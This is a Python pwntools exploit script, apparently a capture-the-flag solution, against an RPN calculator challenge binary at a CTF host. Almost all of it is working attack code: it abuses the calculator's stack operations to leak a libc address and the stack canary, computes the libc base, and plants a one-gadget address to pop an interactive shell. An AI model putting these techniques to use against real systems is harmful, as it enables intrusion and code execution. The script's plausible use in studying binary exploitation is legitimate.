#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 11342)
    else:
        p = process('./chall')
        gdb.attach(p, '''
            continue
        ''')
    return p

p = conn()

def get_libc(p):
    p.sendlineafter(b'RPN> ', b' push 255'*12 + b' rot rot dup pop rot')
    lo = (int(p.recvline().strip())+2**32)%2**32
    p.sendlineafter(b'RPN> ', b' push 255'*13 + b' rot rot dup pop rot')
    hi = (int(p.recvline().strip())+2**32)%2**32
    addr = lo | (hi << 32)
    print(f'addr = {addr:16x}')
    return addr

def get_canary(p):
    #      <63>  0xff | 0 clo chi
    # rot: <63>  0 | clo 0xff chi
    # rot: <63>  clo | 0xff 0 chi
    # dup: <63>  clo clo | 0xff 0 chi
    # pop: <63>  clo | 0xff 0 chi
    # rot: <63>  0xff |  0 clo chi
    p.sendlineafter(b'RPN> ', b' push 255'*64 + b' rot rot dup pop rot')
    clo = (int(p.recvline().strip())+2**32)%2**32
    p.sendlineafter(b'RPN> ', b' push 255'*65 + b' rot rot dup pop rot')
    chi = (int(p.recvline().strip())+2**32)%2**32
    canary = clo | (chi << 32)
    print(f'canary = {canary:16x}')
    return canary

def add_ebp_lo(p, canary, x, gadget):
    #           <64> x | clo chi ebplo
    # push clo: <64> x clo | chi ebplo
    #      rot: <64> x chi | ebplo clo
    #      rot: <64> x ebplo | clo chi 
    #      add: <64> ebplo+x | ebplo clo chi 
    #      dup: <64> ebplo+x ebplo+x | clo chi 
    #      rot: <64> ebplo+x clo | chi ebplo+x 
    command = b''
    clo = canary & 0xffffffff
    chi = canary >> 32
    glo = gadget & 0xffffffff
    ghi = gadget >> 32
    data = [0, clo, chi, 0xbabadeda, 0xdeadbeef, glo, ghi]
    for d in data:
        command += b' push ' + str(d).encode()
    command += b' push 0'*(64-len(data))
    command += b' push ' + str(x).encode()
    command += b' push ' + str(clo).encode()
    command += b' rot rot add dup rot pop pop xxx'
    p.sendlineafter(b'RPN> ', command)
    clo_again = (int(p.recvline().strip())+2**32)%2**32
    new_ebp_lo = (int(p.recvline().strip())+2**32)%2**32
    print(f'new_ebp_lo = {new_ebp_lo:08x}')
    assert clo_again == clo
    return new_ebp_lo


# 0x007b2f9d1f7ee6 -- printf+166
libc_leak = get_libc(p)
elf = ELF('./libc-2.27.so')
printf_offset = elf.symbols['printf']+166
libc_base = libc_leak - printf_offset
print(f'libc_base = {libc_base:016x}')
gadget = 0x4f2a5 + libc_base

canary = get_canary(p)
new_ebp_lo = add_ebp_lo(p, canary, -0x520, gadget)

p.interactive()
